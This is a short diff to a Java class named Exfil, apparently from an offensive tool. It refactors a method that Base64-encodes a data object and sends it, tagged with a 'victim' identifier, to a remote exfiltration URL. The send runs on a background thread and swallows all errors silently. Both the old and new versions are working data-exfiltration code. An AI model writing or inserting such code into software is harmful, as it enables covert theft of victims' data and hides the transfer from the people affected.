@@ -14,14 +14,12 @@ public class Exfil {
 	 * @param data Base64 encoded toString of data object
 	 */
 	public static void exfil(final String exfilLocation, final String victim, final Object data){
-		new Thread(new Runnable(){
-			public void run() {
-				try {
-					URL url = new URL(exfilLocation + "?victim=" + victim + "&data=" + new String(Base64.encodeBase64(data.toString().getBytes())));
-					URLConnection con = url.openConnection();
-					con.getInputStream();
-				} catch (Exception e){}
-			}
+		new Thread(() -> {
+			try {
+				URL url = new URL(exfilLocation + "?victim=" + victim + "&data=" + new String(Base64.encodeBase64(data.toString().getBytes())));
+				URLConnection con = url.openConnection();
+				con.getInputStream();
+			} catch (Exception e){}
 		}).start();
 	}
 	
